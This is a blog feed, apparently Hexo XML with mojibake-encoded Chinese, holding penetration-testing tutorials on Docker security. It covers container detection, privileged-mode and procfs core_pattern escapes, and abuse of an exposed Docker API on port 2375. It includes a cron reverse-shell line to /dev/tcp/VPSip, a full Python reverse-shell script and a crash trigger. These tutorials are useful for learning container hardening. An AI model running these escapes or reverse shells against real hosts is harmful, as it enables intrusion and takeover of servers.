class="hljs-number">2375</span><span class="hljs-regexp">/containers/</span>json  <span class="hljs-regexp">//</span>åˆ—å‡ºå®¹å™¨ä¿¡æ¯<br><br>docker -H tcp:<span class="hljs-regexp">//</span>&lt;target&gt;:<span class="hljs-number">2375</span> ps -a  <span class="hljs-regexp">//</span>æŸ¥çœ‹å®¹å™¨<br><br>docker -H tcp:<span class="hljs-regexp">//</span>&lt;target&gt;:<span class="hljs-number">2375</span> run -it -v <span class="hljs-regexp">/:/m</span>nt nginx:latest <span class="hljs-regexp">/bin/</span>bash   <span class="hljs-regexp">//</span>æ–°è¿è¡Œä¸€ä¸ªå®¹å™¨ï¼ŒæŒ‚è½½ç‚¹è®¾ç½®ä¸ºæœåŠ¡å™¨çš„æ ¹ç›®å½•æŒ‚è½½è‡³/mntç›®å½•ä¸‹<br><br>echo <span class="hljs-string">&#x27;* * * * * /bin/bash -i &gt;&amp; /dev/tcp/VPSip/ç›‘å¬ç«¯å£ 0&gt;&amp;1&#x27;</span> &gt;&gt; <span class="hljs-regexp">/mnt/</span>var<span class="hljs-regexp">/spool/</span>cron<span class="hljs-regexp">/crontabs/</span>root  <span class="hljs-regexp">//</span>åœ¨å®¹å™¨å†…æ‰§è¡Œå‘½ä»¤ï¼Œå°†åå¼¹shellçš„è„šæœ¬å†™å…¥åˆ°<span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span>root<br><br>æœ¬åœ°ç›‘å¬ç«¯å£ï¼Œè·å–å¯¹æ–¹å®¿ä¸»æœºshell<br><br></code></pre></td></tr></table></figure><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_23-00.png" class="" title="2024-02-17_23-00.png">]]></content>
    
    
    <categories>
      
      <category>äº‘åŸç”Ÿå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Dockerå®‰å…¨ï¼ˆä¸€ï¼‰</title>
    <link href="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="Dockerä»‹ç»"><a href="#Dockerä»‹ç»" class="headerlink" title="Dockerä»‹ç»"></a>Dockerä»‹ç»</h2><p>Dockeræ˜¯ä¸€ç§è½»é‡çº§çš„è™šæ‹ŸåŒ–æŠ€æœ¯ï¼ŒåŒæ—¶æ˜¯ä¸€ä¸ªå¼€æºçš„åº”ç”¨å®¹å™¨è¿è¡Œç¯å¢ƒæ­å»ºå¹³å°ï¼Œå¯ä»¥è®©å¼€å‘è€…ä»¥ä¾¿æ·æ–¹å¼æ‰“åŒ…åº”ç”¨åˆ°ä¸€ä¸ªå¯ç§»æ¤çš„å®¹å™¨ä¸­ï¼Œç„¶åå®‰è£…è‡³ä»»ä½•è¿è¡ŒLinuxæˆ–Windowsç­‰ç³»ç»Ÿçš„æœåŠ¡å™¨ä¸Šã€‚ç›¸è¾ƒäºä¼ ç»Ÿè™šæ‹Ÿæœºï¼ŒDockerå®¹å™¨æä¾›è½»é‡åŒ–çš„è™šæ‹ŸåŒ–æ–¹å¼ã€å®‰è£…ä¾¿æ·ã€å¯åœé€Ÿåº¦å¿«</p><p>Dockerå®¹å™¨å…·æœ‰ä»¥ä¸‹ä¸‰å¤§ç‰¹ç‚¹ï¼š<br>è½»é‡åŒ–ï¼šä¸€å°ä¸»æœºä¸Šè¿è¡Œçš„å¤šä¸ªDockerå®¹å™¨å¯ä»¥å…±äº«ä¸»æœºæ“ä½œç³»ç»Ÿå†…æ ¸ï¼›å¯åŠ¨è¿…é€Ÿï¼Œåªéœ€å ç”¨å¾ˆå°‘çš„è®¡ç®—å’Œå†…å­˜èµ„æº<br>æ ‡å‡†å¼€æ”¾ï¼šDockerå®¹å™¨åŸºäºå¼€æ”¾å¼æ ‡å‡†ï¼Œèƒ½å¤Ÿåœ¨æ‰€æœ‰ä¸»æµLinuxç‰ˆæœ¬ã€Microsoft Windowsä»¥åŠåŒ…æ‹¬VMã€è£¸æœºæœåŠ¡å™¨å’Œäº‘åœ¨å†…çš„ä»»ä½•åŸºç¡€è®¾æ–½ä¸Šè¿è¡Œ<br>å®‰å…¨å¯é ï¼šDockerèµ‹äºˆåº”ç”¨çš„éš”ç¦»æ€§ä¸ä»…é™äºå½¼æ­¤éš”ç¦»ï¼Œè¿˜ç‹¬ç«‹äºåº•å±‚çš„åŸºç¡€è®¾æ–½ã€‚Dockeré»˜è®¤æä¾›æœ€å¼ºçš„éš”ç¦»ï¼Œå› æ­¤åº”ç”¨å‡ºç°é—®é¢˜ï¼Œä¹Ÿåªæ˜¯å•ä¸ªå®¹å™¨çš„é—®é¢˜ï¼Œè€Œä¸ä¼šæ³¢åŠåˆ°æ•´å°ä¸»æœº</p><p>Dockerå®¹å™¨çš„è¿è¡Œé€»è¾‘å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒDockerä½¿ç”¨å®¢æˆ·ç«¯&#x2F;æœåŠ¡å™¨ (C&#x2F;S) æ¶æ„æ¨¡å¼ï¼ŒDockerå®ˆæŠ¤è¿›ç¨‹ï¼ˆDocker daemonï¼‰ä½œä¸ºServerç«¯æ¥æ”¶Dockerå®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œå¹¶è´Ÿè´£åˆ›å»ºã€è¿è¡Œå’Œåˆ†å‘Dockerå®¹å™¨ã€‚Dockerå®ˆæŠ¤è¿›ç¨‹ä¸€èˆ¬åœ¨Dockerä¸»æœºåå°è¿è¡Œï¼Œç”¨æˆ·ä½¿ç”¨Dockerå®¢æˆ·ç«¯ç›´æ¥è·ŸDockerå®ˆæŠ¤è¿›ç¨‹è¿›è¡Œä¿¡æ¯äº¤äº’</p><img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/download.png" class="" title="download.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><h2 id="Dockerå®‰å…¨æœºåˆ¶"><a href="#Dockerå®‰å…¨æœºåˆ¶" class="headerlink" title="Dockerå®‰å…¨æœºåˆ¶"></a>Dockerå®‰å…¨æœºåˆ¶</h2><p>æåˆ°Dockerå®‰å…¨ï¼Œå°±ä¸å¾—ä¸è¯´ä»¥ä¸‹åè¯ï¼š</p><p>Namespaceâ€“&gt;å†…æ ¸å‘½åç©ºé—´<br>Linuxçš„namespaceæ˜¯ä¸€ç§å†…æ ¸ç‰¹æ€§ï¼Œå¯ä»¥å°†ç³»ç»Ÿèµ„æºè¿›è¡Œéš”ç¦»ï¼Œæ¯ä¸ªéš”ç¦»çš„éƒ¨åˆ†è¢«ç§°ä¸ºä¸€ä¸ªnamespaceã€‚é€šè¿‡ä½¿ç”¨namespaceï¼Œå¯ä»¥å°†ä¸åŒè¿›ç¨‹ä¹‹é—´çš„èµ„æºè¿›è¡Œéš”ç¦»ï¼Œä½¿å¾—å®ƒä»¬æ„Ÿè§‰åƒæ˜¯åœ¨ç‹¬ç«‹çš„ç¯å¢ƒä¸­è¿è¡Œã€‚ç”¨ç®€æ´æ˜äº†çš„è¯æ¥è¯´,namespaceå®ç°äº†å®¹å™¨ä¸å®¹å™¨,å®¹å™¨ä¸å®¿ä¸»æœºä¹‹é—´çš„éš”ç¦»ï¼Œè€Œä¸šå†…å¹¿ä¸ºäººçŸ¥çš„privilegedç‰¹æƒé€ƒé€¸çš„æœ¬è´¨ä¹Ÿæ˜¯å› ä¸ºç‰¹æƒç¯å¢ƒæ‰“ç ´äº†å®¹å™¨ä¸å®¿ä¸»æœºç›´æ¥çš„éš”ç¦»å®ç°äº†å®¹å™¨é€ƒé€¸</p><p>Cgroupsâ€“&gt;æ§åˆ¶ç»„<br>Cgroupsæœ¬è´¨ä¸Šæ˜¯åœ¨å†…æ ¸ä¸­é™„åŠ çš„ä¸€ç³»åˆ—é’©å­ï¼ˆhookï¼‰ï¼Œå½“ç¨‹åºè¿è¡Œæ—¶ï¼Œå†…æ ¸ä¼šæ ¹æ®ç¨‹åºå¯¹èµ„æºçš„è¯·æ±‚è§¦å‘ç›¸åº”çš„é’©å­ï¼Œä»¥è¾¾åˆ°èµ„æºè¿½è¸ªå’Œé™åˆ¶çš„ç›®çš„ã€‚åœ¨Linuxç³»ç»Ÿä¸­ï¼ŒCgroupså¯¹äºç³»ç»Ÿèµ„æºçš„ç®¡ç†å’Œæ§åˆ¶éå¸¸é‡è¦ï¼Œå¯ä»¥å¸®åŠ©ç®¡ç†å‘˜æ›´åŠ ç²¾ç»†åŒ–åœ°æ§åˆ¶èµ„æºçš„åˆ†é…å’Œä½¿ç”¨ï¼ŒCgroupsä¸»è¦å®ç°äº†å¯¹å®¹å™¨èµ„æºçš„åˆ†é…,é™åˆ¶å’Œç®¡ç†</p><p>Capabilities<br>Capabilitiesæ˜¯Linuxä¸€ç§å®‰å…¨æœºåˆ¶,åœ¨linuxå†…æ ¸2.2ä¹‹åå¼•å…¥,ç”¨äºå¯¹æƒé™æ›´ç»†è‡´çš„æ§åˆ¶</p><p>å‚è€ƒæ–‡ç« ï¼š<br><a href="https://info.support.huawei.com/info-finder/encyclopedia/zh/Docker%E5%AE%B9%E5%99%A8.html">https://info.support.huawei.com/info-finder/encyclopedia/zh/Docker%E5%AE%B9%E5%99%A8.html</a><br><a href="https://www.hacking8.com/MiscSecNotes/23.html">https://www.hacking8.com/MiscSecNotes/23.html</a></p><h2 id="Dockerå¸¸ç”¨æ¸—é€æµ‹è¯•ç‚¹"><a href="#Dockerå¸¸ç”¨æ¸—é€æµ‹è¯•ç‚¹" class="headerlink" title="Dockerå¸¸ç”¨æ¸—é€æµ‹è¯•ç‚¹"></a>Dockerå¸¸ç”¨æ¸—é€æµ‹è¯•ç‚¹</h2><h3 id="å‰æ¸—é€â€”â€”å®¹å™¨åˆ¤æ–­ä¸ä¿¡æ¯æ”¶é›†"><a href="#å‰æ¸—é€â€”â€”å®¹å™¨åˆ¤æ–­ä¸ä¿¡æ¯æ”¶é›†" class="headerlink" title="å‰æ¸—é€â€”â€”å®¹å™¨åˆ¤æ–­ä¸ä¿¡æ¯æ”¶é›†"></a>å‰æ¸—é€â€”â€”å®¹å™¨åˆ¤æ–­ä¸ä¿¡æ¯æ”¶é›†</h3><p>å½“æˆ‘ä»¬æ‹¿åˆ°äº†ä¸€ä¸ªshell,é¦–å…ˆè¦åˆ¤æ–­çš„æ˜¯å½“å‰ç¯å¢ƒæ˜¯å¦ä¸ºå®¹å™¨ç¯å¢ƒï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼è¿›è¡Œåˆ¤æ–­</p><p>1ã€æŸ¥è¯¢cgroupä¿¡æ¯<br>å½“åœ¨å®¹å™¨ä¸­è¿è¡Œè¿›ç¨‹æ—¶ï¼Œæ¯ä¸ªè¿›ç¨‹ä¼šè¢«åˆ†é…åˆ°ä¸€ä¸ªæˆ–å¤šä¸ª cgroup ä¸­ï¼Œcgroup å¯ä»¥å¯¹è¿›ç¨‹çš„èµ„æºä½¿ç”¨è¿›è¡Œæ§åˆ¶å’Œé™åˆ¶ï¼Œè€Œ&#x2F;proc&#x2F;1&#x2F;cgroupæ–‡ä»¶è®°å½•äº†è¿›ç¨‹çš„æ§åˆ¶ç»„ä¿¡æ¯</p><img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-12_21-20.png" class="" title="2024-02-12_21-20.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>é€šè¿‡ä¸Šå›¾å¯çŸ¥ï¼Œæˆ‘ä»¬é€šè¿‡åˆ¤æ–­cat &#x2F;proc&#x2F;1&#x2F;cgroupçš„è¾“å‡ºå†…å®¹æ˜¯å¦æœ‰dockeræ¥åˆ¤æ–­æ˜¯å¦æ˜¯å®¹å™¨å†…çš„ç¯å¢ƒï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç¨å¾®ä¿®æ”¹ä¸€ä¸‹ä¸Šè¿°æŸ¥è¯¢çš„è¯­å¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/1/cgroup | grep -qi docker &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;In Docker&quot;</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Not Docker&quot;</span><br></code></pre></td></tr></table></figure><p>2ã€æŸ¥çœ‹ç¡¬ç›˜ä¿¡æ¯<br>å®¹å™¨è¾“å‡ºä¸ºç©ºï¼Œéå®¹å™¨æœ‰å†…å®¹è¾“å‡ºã€‚å€¼å¾—æ³¨æ„çš„æ˜¯:Privileged ç‰¹æƒæ¨¡å¼ä¸‹ä¹Ÿæ˜¯å¯ä»¥æŸ¥çœ‹åˆ°å†…å®¹çš„</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">fdisk -l</span><br></code></pre></td></tr></table></figure><p>å®¹å™¨å†…ç¯å¢ƒ:</p><img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-12_21-23.png" class="" title="2024-02-12_21-23.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>3ã€æŸ¥è¯¢.dockerenvæ–‡ä»¶<br>.dockerenvæ–‡ä»¶æ˜¯Dockerå®ˆæŠ¤è¿›ç¨‹çš„é…ç½®æ–‡ä»¶ï¼Œå®ƒåŒ…å«äº†Dockerå®ˆæŠ¤è¿›ç¨‹çš„è¿è¡Œå‚æ•°å’Œé…ç½®ä¿¡æ¯ã€‚è¿™ä¸ªæ–‡ä»¶é€šå¸¸ç”¨äºé…ç½®Dockerå®ˆæŠ¤è¿›ç¨‹çš„è¡Œä¸ºï¼Œä¾‹å¦‚å®¹å™¨çš„ç½‘ç»œè®¾ç½®ã€å­˜å‚¨é©±åŠ¨ã€å·ç®¡ç†ç­‰ã€‚.dockerenvæ–‡ä»¶æ˜¯ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«äº†ä¸€äº›ç¯å¢ƒå˜é‡ï¼Œè¿™äº›ç¯å¢ƒå˜é‡æè¿°äº†Dockerå®ˆæŠ¤è¿›ç¨‹çš„çŠ¶æ€å’Œé…ç½®ã€‚è¿™ä¸ªæ–‡ä»¶é€šå¸¸ç”±Dockerå®ˆæŠ¤è¿›ç¨‹çš„é…ç½®è„šæœ¬ç”Ÿæˆï¼Œå¹¶ä¿å­˜åœ¨Dockerå®ˆæŠ¤è¿›ç¨‹çš„æ•°æ®ç›®å½•ä¸­ã€‚ç®€å•æ¥è¯´åªæœ‰åœ¨dockerç¯å¢ƒä¸‹æ‰æœ‰è¿™ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡æ£€æŸ¥æ˜¯å¦æœ‰.dockerenvæ–‡ä»¶ï¼Œæ¥è¿›è¡Œåˆ¤æ–­æ˜¯å¦åœ¨dockerç¯å¢ƒä¸­</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">ls</span> -alh / |grep <span class="hljs-string">.dockerenv</span><br></code></pre></td></tr></table></figure><img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-12_21-23_1.png" class="" title="2024-02-12_21-23_1.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>4ã€æ£€æŸ¥mountä¿¡æ¯+æŒ‚è½½ç‚¹</p><img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-12_21-27.png" class="" title="2024-02-12_21-27.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><h3 id="åæ¸—é€-å¸¸è§dockeré€ƒé€¸"><a href="#åæ¸—é€-å¸¸è§dockeré€ƒé€¸" class="headerlink" title="åæ¸—é€-å¸¸è§dockeré€ƒé€¸"></a>åæ¸—é€-å¸¸è§dockeré€ƒé€¸</h3><p>å®¹å™¨é€ƒé€¸çš„å®è´¨æ˜¯ä»Cgroup&#x2F;Namespace é™åˆ¶æƒé™çš„è¿›ç¨‹è·å–æ›´å¤šæƒé™ï¼Œå¸¸è§çš„dockeré€ƒé€¸æ–¹å¼ï¼š<br>1ã€Priviliged ç‰¹æƒæ¨¡å¼é€ƒé€¸<br>2ã€æŒ‚è½½å®¿ä¸»æœº procfs é€ƒé€¸<br>3ã€æŒ‚è½½ Docker Socket é€ƒé€¸</p><p>ä¸ºäº†æ–¹ä¾¿æ¼”ç¤ºï¼Œåœ¨æ ¹ç›®å½•ä¸‹é¢åˆ›å»ºä¸€ä¸ªflag.txtï¼Œå¦‚æœåœ¨åˆ›å»ºçš„é•œåƒå½“ä¸­çœ‹åˆ°è¿™ä¸ªflagï¼Œè¯æ˜é€ƒé€¸æˆåŠŸ</p><img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_14-49.png" class="" title="2024-02-13_14-49.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><h4 id="Priviliged-ç‰¹æƒæ¨¡å¼é€ƒé€¸"><a href="#Priviliged-ç‰¹æƒæ¨¡å¼é€ƒé€¸" class="headerlink" title="Priviliged ç‰¹æƒæ¨¡å¼é€ƒé€¸"></a>Priviliged ç‰¹æƒæ¨¡å¼é€ƒé€¸</h4><p>å¦‚ä½•åˆ¤æ–­å½“å‰å®¹å™¨æ˜¯ä»¥Privileged ç‰¹æƒæ¨¡å¼å¯åŠ¨çš„å‘¢?</p><p>è¿™é‡Œæä¾›ä¸¤ç§æ–¹å¼ï¼š<br>1ã€æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ fdisk -l æŸ¥çœ‹å®¿ä¸»æœºçš„ç£ç›˜è®¾å¤‡ï¼Œå¦‚æœä¸åœ¨ privileged å®¹å™¨å†…éƒ¨ï¼Œæ˜¯æ²¡æœ‰æƒé™æŸ¥çœ‹ç£ç›˜åˆ—è¡¨å¹¶æ“ä½œæŒ‚è½½çš„<br>2ã€é™¤æ­¤ä¹‹å¤–æˆ‘ä»¬å¯ä»¥é€šè¿‡æŸ¥çœ‹CapEffçš„æ©ç å€¼æ¥åˆ¤æ–­å®¹å™¨æ˜¯ä¸æ˜¯ç‰¹æƒæ¨¡å¼ï¼Œå¦‚æœæ˜¯ä»¥ç‰¹æƒæ¨¡å¼å¯åŠ¨çš„è¯ï¼ŒCapEff å¯¹åº”çš„æ©ç å€¼åº”è¯¥ä¸º0000003fffffffff æˆ–è€…æ˜¯ 0000001fffffffff</p><img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_14-57.png" class="" title="2024-02-13_14-57.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><p>å°è¯•ä½¿ç”¨æ–‡ä»¶æŒ‚è½½è¿›è¡Œé€ƒé€¸ï¼Œç„¶åæˆ‘ä»¬å†é€šè¿‡ cat å»æŸ¥çœ‹è¢«æŒ‚è½½çš„æ–‡ä»¶å¤¹ï¼Œå¦‚æœå¯ä»¥æˆåŠŸçœ‹åˆ°å®¿ä¸»æœºçš„å†…å®¹ï¼Œè¯´æ˜é€ƒé€¸æˆåŠŸ</p><img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_14-57_1.png" class="" title="2024-02-13_14-57_1.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><p>ä»å¯¹æŠ—çš„å±‚é¢ä¸Šï¼Œä¸å»ºè®®å°†é€ƒé€¸çš„è¡Œä¸ºå½“æˆå¯ä»¥å†™å…¥å®¿ä¸»æœºç‰¹å®šæ–‡ä»¶ (å¦‚ &#x2F;etc&#x2F;cron*, &#x2F;root&#x2F;.ssh&#x2F;authorized_keys ç­‰æ–‡ä»¶) çš„è¡Œä¸ºï¼Œåº”è¯¥æ ¹æ®ç›®æ ‡é€‰æ‹©æ›´è¶‹è¿‘ä¸ä¸šåŠ¡è¡Œä¸ºçš„æ‰‹æ³•</p><h4 id="æŒ‚è½½å®¿ä¸»æœº-procfs-é€ƒé€¸"><a href="#æŒ‚è½½å®¿ä¸»æœº-procfs-é€ƒé€¸" class="headerlink" title="æŒ‚è½½å®¿ä¸»æœº procfs é€ƒé€¸"></a>æŒ‚è½½å®¿ä¸»æœº procfs é€ƒé€¸</h4><p>æŒ‚è½½å®¿ä¸»æœº procfs é€ƒé€¸,å…¶æœ¬è´¨ä¸Šå› ä¸ºå®¿ä¸»æœºæŒ‚è½½äº†procfs,å¯¼è‡´æˆ‘ä»¬å¯ä»¥åƒå®¿ä¸»æœºå†…å†™å…¥ä¸€æ®µæ¶æ„çš„payload,æ¯”å¦‚åå¼¹shell,ç„¶ååˆ©ç”¨ä»£ç åˆ¶é€ å´©æºƒ,è§¦å‘å†…å­˜è½¬å‚¨,å°±ä¼šæ‰§è¡Œæˆ‘ä»¬æ¶æ„çš„payload</p><p>Procfs æ˜¯è¿›ç¨‹æ–‡ä»¶ç³»ç»Ÿçš„ç¼©å†™ï¼ŒåŒ…å«ä¸€ä¸ªä¼ªæ–‡ä»¶ç³»ç»Ÿï¼ˆå¯åŠ¨æ—¶åŠ¨æ€ç”Ÿæˆçš„æ–‡ä»¶ç³»ç»Ÿï¼‰ï¼Œç”¨äºé€šè¿‡å†…æ ¸è®¿é—®è¿›ç¨‹ä¿¡æ¯ã€‚linuxè¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿé€šå¸¸è¢«æŒ‚è½½åˆ° &#x2F;proc ç›®å½•ã€‚ç”±äº &#x2F;proc ä¸æ˜¯ä¸€ä¸ªçœŸæ­£çš„æ–‡ä»¶ç³»ç»Ÿï¼Œå®ƒä¹Ÿå°±ä¸å ç”¨å­˜å‚¨ç©ºé—´ï¼Œåªæ˜¯å ç”¨æœ‰é™çš„å†…å­˜ã€‚&#x2F;procä¸­çš„æ–‡ä»¶å¯ä»¥è¢«ä¿®æ”¹ï¼Œä½†ä¸€èˆ¬ä¸å¯ä»¥è¢«åˆ é™¤</p><img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/561614e85933b4d01a5dbf10d2715922.png" class="" title="561614e85933b4d01a5dbf10d2715922.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>å¦‚æœè¿”å›äº†ä¸¤ä¸ª core_pattern æ–‡ä»¶ï¼Œé‚£ä¹ˆå¾ˆå¯èƒ½å°±æ˜¯æŒ‚è½½äº†å®¿ä¸»æœºçš„ procfs</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -name core_pattern<br></code></pre></td></tr></table></figure><p>core_patternï¼ˆæ ¸å¿ƒè½¬å‚¨æ¨¡å¼ï¼‰æ˜¯Linuxç³»ç»Ÿä¸­çš„ä¸€ä¸ªé…ç½®å‚æ•°ï¼Œç”¨äºå®šä¹‰åœ¨ç¨‹åºå´©æºƒæ—¶ç”Ÿæˆæ ¸å¿ƒè½¬å‚¨æ–‡ä»¶çš„æ–¹å¼å’Œä½ç½®ã€‚å½“ä¸€ä¸ªç¨‹åºå‘ç”Ÿå´©æºƒï¼ˆå¦‚æ®µé”™è¯¯ï¼‰æ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šç”Ÿæˆä¸€ä¸ªåŒ…å«ç¨‹åºå´©æºƒçŠ¶æ€çš„æ ¸å¿ƒè½¬å‚¨æ–‡ä»¶ï¼Œä»¥ä¾¿è¿›è¡Œè°ƒè¯•å’Œæ•…éšœæ’é™¤</p><img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_15-18.png" class="" title="2024-02-13_15-18.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><p>æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦æ‰¾åˆ°dockeråœ¨å½“å‰å®¿ä¸»æœºçš„ç»å¯¹è·¯å¾„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/mounts | xargs -d <span class="hljs-string">&#x27;,&#x27;</span> -n 1 | grep workdir<br></code></pre></td></tr></table></figure><img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_15-19.png" class="" title="2024-02-13_15-19.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><p>å¯ä»¥çœ‹å‡º,å½“å‰çš„ç»å¯¹è·¯å¾„ä¸ºï¼š&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;*****************&#x2F;mergedï¼ˆå»é™¤workæ¢æˆmergedï¼‰<br>æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦å‡†å¤‡ä¸€ä¸ªåå¼¹shellçš„è„šæœ¬ä»¥åŠä¸€ä¸ªå¯ä»¥åˆ¶é€ å´©æºƒ,è§¦å‘å†…å­˜è½¬å‚¨çš„ä»£ç <br>åå¼¹shellè„šæœ¬ï¼š</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">#!/usr/bin/python3<br><span class="hljs-keyword">import</span>  <span class="hljs-built_in">os</span><br><span class="hljs-keyword">import</span> pty<br><span class="hljs-keyword">import</span> socket<br>lhost = <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>lport = <span class="hljs-number">0000</span><br>def main():<br>   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>   s.connect((lhost, lport))<br>   <span class="hljs-built_in">os</span>.dup2(s.fileno(), <span class="hljs-number">0</span>)<br>   <span class="hljs-built_in">os</span>.dup2(s.fileno(), <span class="hljs-number">1</span>)<br>   <span class="hljs-built_in">os</span>.dup2(s.fileno(), <span class="hljs-number">2</span>)<br>   <span class="hljs-built_in">os</span>.putenv(<span class="hljs-string">&quot;HISTFILE&quot;</span>, <span class="hljs-string">&#x27;/dev/null&#x27;</span>)<br>   pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)<br>   # <span class="hljs-built_in">os</span>.remove(<span class="hljs-string">&#x27;/tmp/.liuty.py&#x27;</span>)<br>   s.close()<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>   main()<br></code></pre></td></tr></table></figure><p>ï¼ˆæ³¨æ„ï¼šå¦‚æœvimè¢«ç¦ç”¨æˆ–è€…å› ä¸ºåˆ«çš„åŸå› ç”¨ä¸äº†ï¼Œå¯ä»¥ç”¨cat+EOFä»£æ›¿ï¼‰</p><img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_16-53.png" class="" title="2024-02-13_16-53.png"><h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><p>æ¥ä¸‹æ¥èµ‹æƒå¹¶ä¸”å°†è¯¥è„šæœ¬å†™åˆ°ç›®æ ‡çš„ proc ç›®å½•ä¸‹</p><img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_16-58_1.png" class="" title="2024-02-13_16-58_1.png"><h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><p>ç„¶åæˆ‘ä»¬ç”¨cå†™ä¸€ä¸ªå¯ä»¥è§¦å‘å´©æºƒçš„ç¨‹åº</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>  </span>&#123;<br>   <span class="hljs-type">int</span> *a  = <span class="hljs-literal">NULL</span>;<br>   *a = <span class="hljs-number">1</span>;<br>   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>éšåè¿›è¡Œç¼–è¯‘å¹¶èµ‹æƒé™ï¼Œç´§æ¥ç€æˆ‘ä»¬åœ¨æ”»å‡»æœºä¸Šèµ·ç›‘å¬ï¼Œäºæ­¤åŒæ—¶,æˆ‘ä»¬åœ¨å®¹å™¨å†…è¿è¡Œç¼–è¯‘å¥½çš„ç¨‹åº</p><img 